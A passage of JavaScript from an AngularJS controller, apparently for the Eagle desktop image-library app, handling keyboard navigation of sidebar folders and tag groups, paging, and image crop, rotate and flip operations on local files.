                        $scope.updateSidebarList();
                    }
                    localStorage.setItem("eagle.sidebar.smartFolder.expand." + $scope.currentSmartFolder.id, false);
                }
            }
        };

        $scope.keyRightHandler = function(event) {
            event && event.preventDefault();
            if ($(".swal2-container").length > 0) return;
            if ($rootScope.currentFocus == "content") {
                $scope.selectNext(event);
            }
            else {
                if ($rootScope.selectedFolders.length > 1) {
                    $rootScope.selectedFolders.forEach(function (folder) {
                        if (folder.children && folder.children.length > 0) {
                            if (folder.isExpand !== true) {
                                folder.isExpand = true;
                                localStorage.setItem("eagle.sidebar.folder.expand." + folder.id, true);
                            }
                        }
                    });
                    $scope.updateSidebarList();
                }
                else if ($scope.currentFolder) {
                    $scope.currentFolder.isExpand = true;
                    $scope.updateSidebarList();
                    localStorage.setItem("eagle.sidebar.folder.expand." + $scope.currentFolder.id, true);
                }
                else if ($scope.currentSmartFolder) {
                    $scope.currentSmartFolder.isExpand = true;
                    $scope.updateSidebarList();
                    localStorage.setItem("eagle.sidebar.smartFolder.expand." + $scope.currentSmartFolder.id, true);
                }
                else if ($scope.viewMode == "alltags") {
                    $rootScope.currentFocus = "tags";
                }
            }
        };

        $scope.keyUpHandler = function(event) {
            event && event.preventDefault();
            if ($(".swal2-container").length > 0) return;
            if ($rootScope.currentFocus == "content") {
                if ($scope.isDetailMode && !$scope.isInlineMode) {
                    if ($scope.isCropMode) {
                        $rootScope.$broadcast("MOVE-CROP-TOOL", { horizontal: 0, vertical: -1 });
                        return;
                    }
                    else {
                        $("#detail-container").smoothZoom('moveY', -150);
                    }
                } else {
                    $scope.selectUp(event);
                }
            }
            else if ($rootScope.currentFocus == "sidebar") {
                $rootScope.selectedFolders = [];
                $rootScope.selectedFoldersMappings = {};
                $rootScope.selectedSmartFoldersMappings = {};
                $rootScope.selectedSmartFolders = [];
                if ($scope.viewMode == "all") {} else if ($scope.viewMode == "unfiled") { $scope.openAll() } 
                    else if ($scope.viewMode == "untagged") {
                        if ($rootScope.preferences.sidebar.unfiled != 'false') {
                            $scope.openUnfiled();
                        }
                        else {
                            $scope.openAll();
                        }
                    } 
                    else if ($scope.viewMode == "recent") {
                        if ($rootScope.preferences.sidebar.untagged != 'false') {
                            $scope.openUntagged();
                        }
                        else if ($rootScope.preferences.sidebar.unfiled != 'false') {
                            $scope.openUnfiled();
                        }
                        else {
                            $scope.openAll();
                        }
                    }
                    else if ($scope.viewMode == "random") {
                        if ($rootScope.preferences.sidebar.recent != 'false') {
                            $scope.openRecent();
                        }
                        else if ($rootScope.preferences.sidebar.untagged != 'false') {
                            $scope.openUntagged();
                        }
                        else if ($rootScope.preferences.sidebar.unfiled != 'false') {
                            $scope.openUnfiled();
                        }
                        else {
                            $scope.openAll();
                        }
                    }
                    else if ($scope.viewMode == "community") { 
                        if ($rootScope.preferences.sidebar.random != 'false') {
                            $scope.openRandom();
                        }
                        else if ($rootScope.preferences.sidebar.recent != 'false') {
                            $scope.openRecent();
                        }
                        else if ($rootScope.preferences.sidebar.untagged != 'false') {
                            $scope.openUntagged();
                        }
                        else if ($rootScope.preferences.sidebar.unfiled != 'false') {
                            $scope.openUnfiled();
                        }
                        else {
                            $scope.openAll();
                        }
                    } 
                    else if ($scope.viewMode == "alltags") { 
                        if ($rootScope.preferences.sidebar.community2 != 'false') {
                            $scope.openCommunity();
                        }
                        else if ($rootScope.preferences.sidebar.random != 'false') {
                            $scope.openRandom();
                        }
                        else if ($rootScope.preferences.sidebar.recent != 'false') {
                            $scope.openRecent();
                        }
                        else if ($rootScope.preferences.sidebar.untagged != 'false') {
                            $scope.openUntagged();
                        }
                        else if ($rootScope.preferences.sidebar.unfiled != 'false') {
                            $scope.openUnfiled();
                        }
                        else {
                            $scope.openAll();
                        }
                    } 
                    else if ($scope.viewMode == "trash") { 
                        $scope.openAllTags() 
                    } 
                    else {
                    if ($scope.currentId) {
                        if ($scope.currentId.indexOf("smart-folder") > -1) {
                            $scope.openPrevSmartFolder();
                        }
                        else if ($scope.currentId.indexOf("quick") > -1) {
                            openPrevQuickAccess();
                        }
                        else if ($scope.currentId.indexOf("folder") > -1) {
                            $scope.openPrevFolder();
                        }
                    }
                }
            }
            else if ($rootScope.currentFocus == "tags") {
                openPrevGroup();
            }
        };

        function openPrevQuickAccess () {
            var $quickAccessItems = $(".sidebar-quick-access-item:visible");
            var $current = $(".sidebar-quick-access-item.active");
            var currentIndex = $quickAccessItems.index($current);

            if (currentIndex - 1 >= 0) {
                $quickAccessItems.eq(currentIndex - 1).click();
            }
            else {
                $scope.openTrash();
            }
        };

        function openNextQuickAccess () {
            var $quickAccessItems = $(".sidebar-quick-access-item:visible");
            var $current = $(".sidebar-quick-access-item.active");
            var currentIndex = $quickAccessItems.index($current);

            if (currentIndex + 1 < $quickAccessItems.length) {
                $quickAccessItems.eq(currentIndex + 1).click();
            }
            else {
                var listItems = $scope.sidebarList;
                var folders = listItems.filter(function (item) {
                    return item.vstype === 'folder';
                });
                var smartFolders = listItems.filter(function (item) {
                    return item.vstype === 'smartFolder' || item.vstype === 'smartFolderGroup';
                });
                if (smartFolders.length > 0 && smartFolders[0]) {
                    $scope.openSmartFolder(smartFolders[0]);
                }
                else if (folders.length > 0 && folders[0]) {
                    $scope.openFolder(folders[0]);
                }
            }
        };

        $scope.modUpHandler = function (event) {
            if ($scope.isCropMode) {
                event && event.preventDefault();
                $rootScope.$broadcast("RESIZE-CROP-TOOL", {
                    horizontal: 0,
                    vertical: -1
                })
                return;
            }
            else {
                $scope.homeHandler(event);
            }
        };

        $scope.modDownHandler = function (event) {
            if ($scope.isCropMode) {
                event && event.preventDefault();
                $rootScope.$broadcast("RESIZE-CROP-TOOL", {
                    horizontal: 0,
                    vertical: 1
                })
                return;
            }
            else {
                $scope.endHandler(event);
            }
        };

        $scope.modLeftHandler = function (event) {
            event && event.preventDefault();
            if ($scope.isDetailMode) {
                if ($scope.isCropMode) {
                    $rootScope.$broadcast("RESIZE-CROP-TOOL", {
                        horizontal: -1,
                        vertical: 0
                    })
                    return;
                }
                else {
                    $scope.stepBackward();
                }
            }
            else {
                $scope.prevHistory(event);
            }
        };

        $scope.modRightHandler = function (event) {
            event && event.preventDefault();
            if ($scope.isDetailMode) {
                if ($scope.isCropMode) {
                    $rootScope.$broadcast("RESIZE-CROP-TOOL", {
                        horizontal: 1,
                        vertical: 0
                    })
                    return;
                }
                else {
                    $scope.stepForward();
                }
            }
            else {
                $scope.nextHistory(event);
            }
        };

        $scope.modShiftUpHandler = function (event) {
            event && event.preventDefault();
            if ($scope.isCropMode) {
                $rootScope.$broadcast("RESIZE-CROP-TOOL", {
                    horizontal: 0,
                    vertical: -10
                })
                return;
            }
        };

        $scope.modShiftDownHandler = function (event) {
            event && event.preventDefault();
            if ($scope.isCropMode) {
                $rootScope.$broadcast("RESIZE-CROP-TOOL", {
                    horizontal: 0,
                    vertical: 10
                })
                return;
            }
        };

        $scope.modShiftLeftHandler = function (event) {
            event && event.preventDefault();
            if ($scope.isCropMode) {
                $rootScope.$broadcast("RESIZE-CROP-TOOL", {
                    horizontal: -10,
                    vertical: 0
                })
                return;
            }
            else {
                $scope.stepBackward();
            }
        };

        $scope.modShiftRightHandler = function (event) {
            event && event.preventDefault();
            if ($scope.isCropMode) {
                $rootScope.$broadcast("RESIZE-CROP-TOOL", {
                    horizontal: 10,
                    vertical: 0
                })
                return;
            }
            else {
                $scope.stepForward();
            }
        };

        $scope.keyDownHandler = function(event) {
            event && event.preventDefault();
            if ($(".swal2-container").length > 0) return;
            if ($rootScope.currentFocus == "content") {
                if ($scope.isDetailMode && !$scope.isInlineMode) {
                    if ($scope.isCropMode) {
                        $rootScope.$broadcast("MOVE-CROP-TOOL", { horizontal: 0, vertical: 1 });
                        return;
                    }
                    else {
                        $("#detail-container").smoothZoom('moveY', 150);
                    }
                } else {
                    $scope.selectDown(event);
                }
            }
            else if ($rootScope.currentFocus == "sidebar") {
                $rootScope.selectedFolders = [];
                $rootScope.selectedFoldersMappings = {};
                $rootScope.selectedSmartFoldersMappings = {};
                $rootScope.selectedSmartFolders = [];
                if ($scope.viewMode == "all") { 
                    if ($rootScope.preferences.sidebar.unfiled != 'false') {
                        $scope.openUnfiled();
                    }
                    else if ($rootScope.preferences.sidebar.untagged != 'false') {
                        $scope.openUntagged();
                    }
                    else if ($rootScope.preferences.sidebar.recent != 'false') {
                        $scope.openRecent();
                    }
                    else if ($rootScope.preferences.sidebar.random != 'false') {
                        $scope.openRandom();
                    }
                    else if ($rootScope.preferences.sidebar.community2 != 'false') {
                        $scope.openCommunity();
                    }
                    else {
                        $scope.openAllTags();
                    }
                } 
                else if ($scope.viewMode == "unfiled") { 
                    if ($rootScope.preferences.sidebar.untagged != 'false') {
                        $scope.openUntagged();
                    }
                    else if ($rootScope.preferences.sidebar.recent != 'false') {
                        $scope.openRecent();
                    }
                    else if ($rootScope.preferences.sidebar.random != 'false') {
                        $scope.openRandom();
                    }
                    else if ($rootScope.preferences.sidebar.community2 != 'false') {
                        $scope.openCommunity();
                    }
                    else {
                        $scope.openAllTags();
                    }
                } 
                else if ($scope.viewMode == "untagged") { 
                    if ($rootScope.preferences.sidebar.recent != 'false') {
                        $scope.openRecent();
                    }
                    else if ($rootScope.preferences.sidebar.random != 'false') {
                        $scope.openRandom();
                    }
                    else if ($rootScope.preferences.sidebar.community2 != 'false') {
                        $scope.openCommunity();
                    }
                    else {
                        $scope.openAllTags();
                    }
                }
                else if ($scope.viewMode == "recent") { 
                    if ($rootScope.preferences.sidebar.random != 'false') {
                        $scope.openRandom();
                    }
                    else if ($rootScope.preferences.sidebar.community2 != 'false') {
                        $scope.openCommunity();
                    }
                    else {
                        $scope.openAllTags();    
                    }
                }
                else if ($scope.viewMode == "random") { 
                    if ($rootScope.preferences.sidebar.community2 != 'false') {
                        $scope.openCommunity();
                    }
                    else {
                        $scope.openAllTags();
                    }
                }
                else if ($scope.viewMode == "community") { 
                    $scope.openAllTags();
                }
                else if ($scope.viewMode == "alltags") { $scope.openTrash() } else if ($scope.viewMode == "trash") {

                    var listItems = $scope.sidebarList;
                    var folders = listItems.filter(function (item) {
                        return item.vstype === 'folder';
                    });
                    var smartFolders = listItems.filter(function (item) {
                        return item.vstype === 'smartFolder' || item.vstype === 'smartFolderGroup';
                    });
                    var quickAccessItems = listItems.filter(function (item) {
                        return item.vstype === 'quickAccess';
                    });
                    if (quickAccessItems.length > 0) {
                        $("#quick-access-" + quickAccessItems[0].id).click();
                    }
                    else if (smartFolders.length > 0 && smartFolders[0]) {
                        $scope.openSmartFolder(smartFolders[0]);
                    }
                    else if (folders.length > 0 && folders[0]) {
                        $scope.openFolder(folders[0]);
                    }
                }
                else {
                    if ($scope.currentId.indexOf("smart-folder") > -1) {
                        $scope.openNextSmartFolder();
                    }
                    else if ($scope.currentId.indexOf("quick") > -1) {
                        openNextQuickAccess();
                    }
                    else if ($scope.currentId.indexOf("folder") > -1) {
                        $scope.openNextFolder();
                    }
                }
            }
            else if ($rootScope.currentFocus == "tags") {
                openNextGroup();
            }
        };

        function scrollbarTo(element, to, duration) {
            var start = element.scrollTop,
                change = to - start,
                currentTime = 0,
                increment = 20;
                
            var animateScroll = function(){        
                currentTime += increment;
                var val = Math.easeInOutQuad(currentTime, start, change, duration);
                element.scrollTop = val;
                if(currentTime < duration) {
                    setTimeout(animateScroll, increment);
                }
            };
            animateScroll();
        }

        //t = current time
        //b = start value
        //c = change in value
        //d = duration
        Math.easeInOutQuad = function (t, b, c, d) {
          t /= d/2;
            if (t < 1) return c/2*t*t + b;
            t--;
            return -c/2 * (t*(t-2) - 1) + b;
        };

        $scope.pageDownHandler = _.throttle(function(event) {
            var offset = $(window).height() - 72;
            if ($scope.isDetailMode) {
                $("#detail-container").smoothZoom('moveY', offset);
            }
            else {
                var scrollTop = $(".box-container").scrollTop();
                scrollbarTo($(".box-container")[0], scrollTop + offset * 1, 100);
            }
        }, 100, true);

        $scope.pageUpHandler = _.throttle(function(event) {
            var offset = $(window).height() - 72;
            if ($scope.isDetailMode) {
                $("#detail-container").smoothZoom('moveY', -offset);
            }
            else {
                var scrollTop = $(".box-container").scrollTop();
                scrollbarTo($(".box-container")[0], scrollTop - offset * 1, 100);
                setTimeout(function () {
                    if ($scope.startCursor !== 0 && $("#box-container").scrollTop() === 0) {
                        ig.trigger("prepend");
                    }
                }, 200);
            }
        }, 100, true);

        $scope.homeHandler = function(event) {
            if ($scope.isDetailMode) {
            	clearTimeout(updateZoomRatioTimeout);
                $("#detail-container").addClass("zooming");
                updateZoomRatioTimeout = setTimeout(function () {
                    $("#detail-container").removeClass("zooming");
                }, 300);
            	$("#detail-container").smoothZoom('goToY', 40);
            }
            else {
                $scope.gotoTop();
            }
        };

        $scope.endHandler = function(event) {
            if ($scope.isDetailMode) { 
            	clearTimeout(updateZoomRatioTimeout);
                $("#detail-container").addClass("zooming");
                updateZoomRatioTimeout = setTimeout(function () {
                    $("#detail-container").removeClass("zooming");
                }, 300);
            	$("#detail-container").smoothZoom('goToY', -99999999);
            	$("#detail-container").smoothZoom('moveY', -window.outerHeight + 60);
            }
            else { 
                $scope.gotoBottom();
            }
        };

        $scope.delHandler = function (event) {
            if (process.platform === 'darwin') {
                $scope.removeSelected();
            }
        }

        $scope.shiftCHandler = function (event) {
            if (!$scope.current) return;
        	if (!$rootScope.supportCrop || ($scope.current.ext!=='jpg' && $scope.current.ext!=='png' && $scope.current.ext!=='webp')) {
        		$scope.copeVideoFrame(event);
        	}
        	else {
				$scope.cropImage(event);
        	}
        }

        $scope.removeFromFolderHandler = function () {
            if (process.platform !== 'darwin') {
                $scope.$evalAsync(function() {
                    $scope.removeFromFolder(event, $scope.currentFolder.id);
                });
            }
        }

        $scope.openNextFolder = function() {
            var nextFolder;
            var listItems = $scope.sidebarList;
            var folders = listItems.filter(function (item) {
                return item.vstype === 'folder';
            });
            var idx = folders.indexOf($scope.currentFolder);
            nextFolder = folders[idx + 1];
            
            if (nextFolder) {
                $scope.openFolder(nextFolder);
                $scope.changeSidebarIndex(nextFolder);
            }
        };

        function openPrevGroup () {
            if ($scope.tagViewMode === "ALL") {
                return;
            }
            else if ($scope.tagViewMode === "UNFILED") {
                $scope.openTagAllGroup();
            }
            else if ($scope.tagViewMode === "STARRED") {
                $scope.openUnfiledGroup();
            }
            else {
                var $visibleGroups = $(".tag-manager-sidebar .group-item:visible");
                var $currentGroup = $(".tag-manager-sidebar .group-item.active");
                var currentIndex = $visibleGroups.index($currentGroup);
                if (currentIndex === 0) {
                    $scope.openStarredGroup();
                }
                else if (currentIndex > 0) {
                    var prev = $scope.TagManager.groups[currentIndex - 1];
                    if (prev) {
                        $scope.openTagGroup(prev);
                    }
                }
            }
        };

        function openNextGroup () {
            if ($scope.tagViewMode === "ALL") {
                $scope.openUnfiledGroup();
            }
            else if ($scope.tagViewMode === "UNFILED") {
                $scope.openStarredGroup();
            }
            else if ($scope.tagViewMode === "STARRED") {
                if ($scope.TagManager.groups[0]) {
                    $scope.openTagGroup($scope.TagManager.groups[0]);
                }
            }
            else if ($scope.TagManager.groups.length > 0) {
                var $visibleGroups = $(".tag-manager-sidebar .group-item:visible");
                var $currentGroup = $(".tag-manager-sidebar .group-item.active");
                var currentIndex = $visibleGroups.index($currentGroup);
                var next = $scope.TagManager.groups[currentIndex + 1];
                if (next) {
                    $scope.openTagGroup(next);
                }
            }
        };

        $scope.openNextSmartFolder = function() {
            var nextSmartFolder;
            var listItems = $scope.sidebarList;
            var smartFolders = listItems.filter(function (item) {
                return item.vstype === 'smartFolder' || item.vstype === 'smartFolderGroup';
            });
            var idx = smartFolders.indexOf($scope.currentSmartFolder);
            nextSmartFolder = smartFolders[idx + 1];
            if (nextSmartFolder) {
                $scope.openSmartFolder(nextSmartFolder);
                $scope.changeSidebarIndex(nextSmartFolder);
            } 
            else {
                var folders = listItems.filter(function (item) {
                    return item.vstype === 'folder';
                });
                if (folders.length > 0) {
                    $scope.openFolder(folders[0]);
                    $scope.changeSidebarIndex(folders[0]);
                }
            }
        };

        $scope.openPrevSmartFolder = function() {
            var prevSmartFolder;
            var listItems = $scope.sidebarList;
            var smartFolders = listItems.filter(function (item) {
                return item.vstype === 'smartFolder' || item.vstype === 'smartFolderGroup';
            });
            var idx = smartFolders.indexOf($scope.currentSmartFolder);
            prevSmartFolder = smartFolders[idx - 1];
            if (prevSmartFolder) {
                $scope.openSmartFolder(prevSmartFolder);
                $scope.changeSidebarIndex(prevSmartFolder);
            } else {
                // 如果有 quick access 就进入 quick access 若无，进入 Trash
                if ($rootScope.preferences.sidebar.quickAccess != 'false') {
                    var quickAccessItems = listItems.filter(function (item) {
                        return item.vstype === 'quickAccess';
                    });
                    if (quickAccessItems.length > 0) {
                        $("#quick-access-" + quickAccessItems[quickAccessItems.length - 1].id).click();
                    }
                    else {
                        $scope.openTrash();
                    }
                }
                else {
                    $scope.openTrash();
                }
            }
        };

        $scope.openPrevFolder = function() {

            var prevFolder;
            var listItems = $scope.sidebarList;
            var folders = listItems.filter(function (item) {
                return item.vstype === 'folder';
            });
            var idx = folders.indexOf($scope.currentFolder);
            prevFolder = folders[idx - 1];

            if (prevFolder) {
                $scope.openFolder(prevFolder);
                $scope.changeSidebarIndex(prevFolder);
            }
            else {
                var quickAccessItems = listItems.filter(function (item) {
                    return item.vstype === 'quickAccess';
                });
                var smartFolders = listItems.filter(function (item) {
                    return item.vstype === 'smartFolder' || item.vstype === 'smartFolderGroup';
                });
                if (smartFolders.length > 0 && smartFolders[smartFolders.length - 1]) {
                    $scope.openSmartFolder(smartFolders[smartFolders.length - 1]);
                    $scope.changeSidebarIndex(smartFolders[smartFolders.length - 1]);
                }
                else if (quickAccessItems.length > 0 && quickAccessItems[quickAccessItems.length - 1]) {
                    $("#quick-access-" + quickAccessItems[quickAccessItems.length - 1].id).click();
                }
                else {
                    $scope.openTrash();
                }
            }
        };

        $scope.selectUp = function(event) {

            event && event.preventDefault();

            var selection = $scope.getSelection();
            var start = selection.start;
            var $box = $(".box.selected").eq(0);
            var boxOffest = $box.offset();
            if (!boxOffest) return;
            var boxCenterX = boxOffest.left;
            var boxCenterY = boxOffest.top;
            var target;
            var d = 100000;

            $(".box").each(function(index) {
                var $b = $(this);
                var offset = $b.offset();
                var bx = offset.left;
                var by = offset.top;
                if ($scope.layout === "GridLayout") {
                    var td = Math.abs(boxCenterY - by);
                    if (boxCenterX == bx && boxCenterY > by) {
                        if (td < d) {
                            d = td;
                            target = $b;
                        }
                    }
                }
                else {
                    var td = Math.sqrt((boxCenterY - by) * (boxCenterY - by) + (boxCenterX - bx) * (boxCenterX - bx));
                    if (boxOffest.top > offset.top && Math.abs(boxOffest.top - offset.top) > 20) {
                        if (td < d) {
                            d = td;
                            target = $b;
                        }
                    }
                }
            });
            if (target) {
                var image = $scope.getItemByElement(target[0]);
                $scope.selected = [image];
                $scope.selectedFolderMappings = {};
                if ($scope.isDetailMode) {
                    $scope.current = $scope.selected[0];
                }
                autoScroll(target);
            }
            if ($scope.isDetailMode) {
                $scope.forceFitImageSize($scope.selected[0], true);
                $scope.current = $scope.selected[0];
                $scope.isGifReady = false;
                $("#detail-container").smoothZoom('updateNavigator', $bodyScope.current);
                if (!$scope.lastZoom()) {
                    $scope.zoom();
                }
            }
        };

        $scope.multipleSelectUp = function(event) {
            if ($scope.isCropMode) {
                $rootScope.$broadcast("MOVE-CROP-TOOL", { horizontal: 0, vertical: -10 });
                return;
            }
            if ($scope.layout === "ListLayout") {
                $scope.multipleSelectPrev(event);
            }
        };

        $scope.selectDown = function(event) {
            event && event.preventDefault();
            var selection = $scope.getSelection();
            var end = selection.end || 0;
            var $arround = getArroundBox(end);
            var $box = $(".box.selected").last();
            var boxOffest = $box.offset();
            if (!boxOffest) return;
            var boxCenterX = boxOffest.left;
            var boxCenterY = boxOffest.top;
            var target;
            var d = 100000;
            $(".box").each(function(index) {
                var $b = $(this);
                var offset = $b.offset();
                var bx = offset.left;
                var by = offset.top;
                if ($scope.layout === "GridLayout") {
                    var td = Math.abs(by - boxCenterY);
                    if (boxCenterX == bx && by > boxCenterY) {
                        if (td < d) {
                            d = td;
                            target = $b;
                        }
                    }
                }
                else {
                    var td = Math.sqrt((boxCenterY - by) * (boxCenterY - by) + (boxCenterX - bx) * (boxCenterX - bx));
                    if (boxOffest.top < offset.top && Math.abs(boxOffest.top - offset.top) > 20) {
                        if (td < d) {
                            d = td;
                            target = $b;
                        }
                    }
                }
            });
            if (target) {
                var image = $scope.getItemByElement(target[0]);
                $scope.selected = [image];
                $scope.selectedFolderMappings = {};
                if ($scope.isDetailMode) {
                    $scope.current = $scope.selected[0];
                }
                autoScroll(target);
            }
            if ($scope.isDetailMode) {
                $scope.forceFitImageSize($scope.selected[0], true);
                $scope.current = $scope.selected[0];
                $scope.isGifReady = false;
                $("#detail-container").smoothZoom('updateNavigator', $bodyScope.current);
                if (!$scope.lastZoom()) {
                    $scope.zoom();
                }
            }
        };

        $scope.multipleSelectDown = function(event) {
            if ($scope.isCropMode) {
                $rootScope.$broadcast("MOVE-CROP-TOOL", { horizontal: 0, vertical: 10 });
                return;
            }
            if ($scope.layout === "ListLayout") {
                $scope.multipleSelectNext(event);
            }
        };

        $scope.cropImage = function (event, img) {
            if (!$scope.current) return;
            if (!$rootScope.supportCrop || ($scope.current.ext!=='jpg' && $scope.current.ext!=='png' && $scope.current.ext!=='webp')) return;
            if ($scope.isRotating) return;
            if ($scope.isDetailMode && !$scope.isCropMode) {
                $scope.isCropMode = true;
                $scope.switchToPreviewMode();
                $scope.zoomFit();
            }
        }

        $scope.saveHandler = function () {
            if ($scope.isRotating) return;
            if ($scope.isCropMode) {
                $scope.saveCrop();
            }
        };

        $scope.saveCrop = function (saveAsNewFile) {
            var $cropArea = $("#crop-image-tool .crop-area");
            var [top, left] = [$cropArea.css("top").replace("px", ""), $cropArea.css("left").replace("px", "")];
            var [width, height] = [$cropArea.width(), $cropArea.height()];
            var croppedImage = $scope.current;
            var imagePath = FileUrlHelper.getRawPath(croppedImage);

            electronLog.info(`[app] Crop image: ${imagePath}`);

            if (!fs.existsSync(imagePath)) {
                $scope.cancelCrop();
                electronLog.error(`[app] Image file does not exist`);
                return;
            }
            setTimeout(() => {
                const imageCropper = require(appRoot + '/my_modules/image-cropper');
                imageCropper(imagePath, croppedImage, top, left, width, height, function (err, { buffer, base64 }) {
                    electronLog.info(`[app] Prepare to write to file: ${imagePath}`);

                    if (buffer && buffer.length > 0) {

                        if (saveAsNewFile) {
                            let newId = guid();
                            let newFilePath = `${EAGLE_THUMBNAIL_TEMP_PATH}/${newId}.${croppedImage.ext}`;
                            fs.writeFile(newFilePath, buffer, function (err) {
                                let newFile = {
                                    name: croppedImage.name,
                                    path: newFilePath,
                                    lastModified: Date.now(),
                                    tags: croppedImage.tags || [],
                                    folders: croppedImage.folders || [],
                                    url: croppedImage.url || "",
                                    lastModified: croppedImage.modificationTime + 0.1,
                                    modificationTime: croppedImage.modificationTime + 0.1,
                                    star: croppedImage.star,
                                    merged: true
                                };
                                $scope.uploadFiles([newFile]);
                                $scope.isCropMode = false;
                                $scope.leaveDetailMode();
                                $scope.$evalAsync();
                            });
                            return;
                        }

                        setTimeout(function () {
                            swal({
                                html: `
                                    <div class="alert">
                                        <div class="alert-image" style="display: flex; justify-content: center;">
                                            <img src="${base64}" style="margin-bottom: 12px;object-fit: scale-down;width: 350px;height: 350px;border-radius: 6px;">
                                        </div>
                                        <h4 class="alert-title">${i18n.__("dialog.cropConfirm.title")}</h4>
                                        <p class="alert-desc">${i18n.__("dialog.cropConfirm.desc")}</p>
                                    </div>
                                `,
                                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                                width: 400,
                                customClass: "tutorial-modal",
                                cancelButtonColor: "#777777",
                                confirmButtonText: i18n.__("dialog.cropConfirm.saveButton"),
                                cancelButtonText: i18n.__("general.cancel"),
                            }).then(function() {
                                fse.copySync(imagePath, imagePath + ".bk", { preserveTimestamps: true });
                                    fs.writeFile(imagePath, buffer, function (err) {
                                        if (!err) {
                                            fse.removeSync(imagePath + ".bk");
                                            ipcRenderer.send('regenerate-thumbnail', [croppedImage]);
                                            [croppedImage.width, croppedImage.height] = [width, height];
                                            $scope.updateItemView(croppedImage);

                                            // 强制更新相关 folder 封面
                                            if (croppedImage.folders) {
                                                croppedImage.folders.forEach(function (fid) {
                                                    $scope.resetFolderCover($scope.folderMappings[fid]);
                                                });
                                            }

                                            $scope.calculateImageBinding({ ignoreSort: true }, function () {});
                                            $scope.relayout();
                                            $scope.$evalAsync();
                                        }
                                        else {
                                            fse.copySync(imagePath + ".bk", imagePath, { preserveTimestamps: true });
                                            fse.removeSync(imagePath + ".bk");
                                        }
                                        $scope.isCropMode = false;
                                        $scope.$evalAsync();
                                    });
                            });
                        }, 200);
                    }
                    else {
                        $scope.isCropMode = false;
                    }
                });
            }, 500);
        };

        $scope.cancelCrop = function () {
            $scope.isCropMode = false;
        };

        $scope.flipImage = function (event, image) {

            if ($scope.isCropMode) return;
            var rotatedImage = image || $scope.selected[0];
            if (!rotatedImage) return;
            // var degree = $("#detail-image").data("degree") || 0;
            var scaleX = $("#detail-image").data("scaleX") || 1;
            var scaleY = $("#detail-image").data("scaleY") || 1;

            if (event.type === "click") {
                if (!event.shiftKey) {
                    scaleX = -scaleX;
                }
                else {
                    scaleY = -scaleY;
                }
            }
            else {
                scaleX = -scaleX;
            }
            
            $("#detail-image").data("scaleX", scaleX);
            $("#detail-image").data("scaleY", scaleY);
            $("#detail-image").css({
                "transform": `scaleX(${scaleX}) scaleY(${scaleY})`,
                "transition": "none"
            });
            $("#detail-image").css({
                "transform": `scaleX(${scaleX}) scaleY(${scaleY})`,
                "transition": "none"
            });
            $("#detail-container").smoothZoom('flip');
        };

        $scope.rotateVideo = function (event) {
        	var video = $(".detail-wrap video")[0];
            if (video) {
            	var $video = $(video);
            	var degree = $video.data("degree") || 0;
            	// 鼠标点击
	            if (event.type === "click") {
	                if (!event.shiftKey) {
	                    degree = degree - 90;
	                }
	                else {
	                    degree = degree + 90;
	                }
	            }
	            else {
	                degree = degree - 90;
	            }

	            degree = degree % 360;
				if (degree < 0) { degree += 360; }

	            $video.data("degree", degree);
            	$video.removeClass("r90 r180 r270");
            	$video.addClass(`r${degree}`);

                if (degree === 90 || degree === 270) {
                    video.style.setProperty('max-height', `calc(${video.videoHeight / video.videoWidth * 100}% - 24px)`, 'important');
                }
                else {
                    $video.css({
                        "max-height": ""
                    });
                }
            }
        };

        $scope.flipVideo = function (event) {
        	var video = $(".detail-wrap video")[0];
            if (video) {
            	var $video = $(video);
            	var flip = $video.data("flip") || 1;
            	flip = flip * -1;
	            if (flip === 1) {
	            	$video.removeClass("flip");
	            }
	            else {
	            	$video.addClass("flip");
	            }
	            $video.data("flip", flip);
            }
        };

        var rotateImageTimeout;
        var rotateImageSaveTimeout;
        var lastRotateImage;
        $scope.rotateImage = function (event, image) {

            if ($scope.isCropMode) return;

            if (lastRotateImage === image) {
	            clearTimeout(rotateImageTimeout);
	            clearTimeout(rotateImageSaveTimeout);
            }

            if ($("canvas#detail-image").length > 0) {
                alert("Not support apng file format.");
                return;
            }

            var rotatedImage = image || $scope.selected[0];
            if (!rotatedImage) return;
            const [originalWidth, originalHeight] = [rotatedImage.width, rotatedImage.height];
            [rotatedImage.width, rotatedImage.height] = [originalHeight, originalWidth];
            var degree = $("#detail-image").data("degree") || 0;
            const lastDegree = degree;
            // 鼠标点击
            if (event.type === "click") {
                if (!event.shiftKey) {
                    degree = degree - 90;
                    $("#detail-container").smoothZoom('rotate', {angle: -90, item: rotatedImage});
                }
                else {
                    degree = degree + 90;
                    $("#detail-container").smoothZoom('rotate', {angle: 90, item: rotatedImage});
                }
            }
            else {
                degree = degree - 90;
                $("#detail-container").smoothZoom('rotate', {angle: -90, item: rotatedImage});
            }

            $("#detail-image").data("degree", degree);
            $("#detail-image").css({
                "transform": `rotate(${degree}deg) scaleX(1) scaleY(1)`,
                "transition": "transform 100ms ease-in-out"
            });

            lastRotateImage = rotatedImage;

            $scope.isRotating = true;
            rotateImageSaveTimeout = setTimeout(async function () {

                // 检查度数，如果不为 0 执行写入动作
                if (degree % 360 != 0) {
                    var rawPath = FileUrlHelper.getRawPath(rotatedImage);
                    var rawUrl = $bodyScope.getRawUrl(rotatedImage);
                    if (!rawPath) {
                        $scope.isRotating = false;
                        return;
                    }

					try {
						fs.accessSync(rawPath, fs.W_OK)
					}
					catch (err) {
                        $scope.isRotating = false;
                        rotatedImage.width = originalWidth;
                        rotatedImage.height = originalHeight;
						$("#detail-image").css({
							"transform": `none`,
							"transition": "none"
						});

						swal({
                            html: `
                                <div class="alert">
                                    <div class="alert-icon error"></div>
                                    <h4 class="alert-title">Error</h4>
                                    <p class="alert-desc">${err?.message}</p>
                                </div>
                            `,
							showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
							width: 400,
                            customClass: "alert-box",
							confirmButtonColor: "#1373FB", // 1373FB
							cancelButtonColor: "#777777",
							confirmButtonText: i18n.__('general.ok'),
							cancelButtonText: i18n.__("general.cancel"),
						}).then(() => {});
						return;
					}

                    if (rotatedImage.ext === 'png') {
                        console.time("checkAPNG");
                        APNG.parseURL(rawUrl).then(function (data) {
                            clearTimeout(rotateImageTimeout);
                            clearTimeout(rotateImageSaveTimeout);
                            $("#detail-image").css({
                                "transform": `none`,
                                "transition": "none"
                            });
                            $scope.isRotating = false;
                            alert("Not support apng file format.");
                        }, function (data) {
                            var dest = `${rawPath}_${Date.now()}`;
                            var destUrl = URL_MODULE.pathToFileURL(dest).href;
